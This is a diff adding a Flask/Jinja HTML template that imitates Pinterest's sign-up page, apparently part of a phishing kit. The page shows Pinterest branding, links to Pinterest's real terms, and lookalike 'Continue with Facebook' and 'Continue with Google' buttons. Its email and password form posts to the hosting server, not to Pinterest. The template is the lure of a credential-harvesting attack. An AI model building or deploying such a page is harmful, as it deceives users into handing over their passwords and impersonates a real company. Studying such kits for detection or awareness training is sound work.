@@ -1,0 +1,71 @@
+<html>
+
+{% block head%}
+
+  <head>
+    <title>Pinterest</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='../../static/pinterest/main.css') }}">
+  </head>
+
+{% endblock %}
+
+{% block body %} 
+  <body>
+    <table cellspacing="0" border="0" align="center" width="380">
+      <tr>
+        <td class="">&nbsp;</td>
+      </tr>
+      <tr>
+        <td align="center"><img src="https://graffica.info/wp-content/uploads/2017/08/badgeRGB.png" width="30"></td>
+      </tr>
+      <tr>
+        <td align="center"><font size="5"><b>Welcome to Pinterest</b></font></td>
+      </tr>
+      <tr>
+        <td align="center"><font size="2">Find new ideas to try</font></td>
+      </tr>
+      <tr>
+        <td class="space">&nbsp;</td>
+      </tr>
+      <form action="/" method="POST">
+        <tr>
+            <td class="box" align="center"><input class="form" name="username" type="text" placeholder="Email"></td>
+        </tr>
+      
+        <tr>
+            <td class="box" align="center"><input class="form" name="password" type="password" placeholder="Create a password" autocomplete="off"></td>
+        </tr>
+        <tr>
+    <td class="box" align="center"><button class="buttonP" type="submit"><a href=""><b> Continue</a></b></button></td>
+        </tr>
+    </form>
+      <tr>
+        <td align="center"><font size="1"><b>OR</b></font></td>
+      </tr>
+      <tr>
+        <td class="box" align="center"><button class="buttonF" type="submit"><img src="https://vuela.tag.com.gt/hubfs/Iconos-Redes-Sociales/facebook-round-white.png" width="15" alt="icon-facebook" align="left"><a href="javascript:void(0);" onclick="javascript:facebook('https://www.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26auth_type%26cbt%3D1589863774049%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fconnect%252Fxd_arbiter.php%253Fversion%253D46%2523cb%253Df38c948724e6294%2526domain%253Dwww.pinterest.cl%2526origin%253Dhttps%25253A%25252F%25252Fwww.pinterest.cl%25252Ff19a24e0f586294%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dpopup%26domain%3Dwww.pinterest.cl%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.pinterest.cl%252F%26id%3Df1388f4ec7dbdcc%26locale%3Des_LA%26logger_id%3D849da689-0777-45ca-b066-101dde6c2f88%26origin%3D1%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fconnect%252Fxd_arbiter.php%253Fversion%253D46%2523cb%253Df12668d274ca058%2526domain%253Dwww.pinterest.cl%2526origin%253Dhttps%25253A%25252F%25252Fwww.pinterest.cl%25252Ff19a24e0f586294%2526relation%253Dopener.parent%2526frame%253Df1388f4ec7dbdcc%26ref%3DLoginButton%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_likes%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26size%3D%257B%2522width%2522%253A600%252C%2522height%2522%253A679%257D%26url%3Ddialog%252Foauth%26version%3Dv3.0%26ret%3Dlogin%26fbapp_pres%3D0&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D46%23cb%3Df12668d274ca058%26domain%3Dwww.pinterest.cl%26origin%3Dhttps%253A%252F%252Fwww.pinterest.cl%252Ff19a24e0f586294%26relation%3Dopener.parent%26frame%3Df1388f4ec7dbdcc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=es_LA&pl_dbl=0')"><b> Continue with Facebook</a></b></button></td>
+      </tr>
+      <tr>
+        <td class="box" align="center"><button class="buttonG" type="button"><img src="https://www.konfest.com/wp-content/uploads/2019/05/Konfest-PNG-JPG-Image-Pic-Photo-Free-Download-Royalty-Unlimited-clip-art-sticker-icon-google-website-search-engine-information-company-logo-17.png" width="18" alt="x" align="left"><a href="javascript:void(0);" onclick="javascript:google('https://accounts.google.com/signin/oauth/identifier?redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.pinterest.cl%3Fid%3Dauth210312&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&client_id=694505692171-31closf3bcmlt59aeulg2j81ej68j6hk.apps.googleusercontent.com&ss_domain=https%3A%2F%2Fwww.pinterest.cl&fetch_basic_profile=true&gsiwebsdk=2&o2v=1&as=RA4lXcLdI8ElTh1p7HbuIQ&flowName=GeneralOAuthFlow')"><font color="#000000"><b>Continue with Google</b></font></button></td>
+      </tr>
+      <tr>
+        <td>
+          <table align="center" cellpadding="5" width="240">
+            <tr>
+        <td class="space0" align="center" cellpadding="0"><font size="1">By continuing you agree to Pinterest's <b><a href="https://policy.pinterest.com/es/terms-of-service" target="_blank"><font color="#000000">Terms of Service.</font></a><a href="https://policy.pinterest.com/es/privacy-policy" target="_blank"><font color="#000000"> Privacy Policy</font></a></b></font></td>
+            </tr>
+          </table>
+        </td>
+      </tr>
+      <tr>
+        <td class="box" align="center"><a href="javascript:login('https://www.pinterest.cl/login/')"><font font size="1" color="#000000"><b>Already a member? Log in</b></font></a></td>
+      </tr>
+      <tr>
+        <td class="spacef" align="center"><a href="https://www.pinterest.cl/business/create/?next=%2Fbusiness%2Fcreate%2F"><font size="2" color="#000000"><b>Create a business account</b></font></a></td>
+    </tr>
+     </table>
+  </font>
+ </body>
+
+ {% endblock %}
+</html>
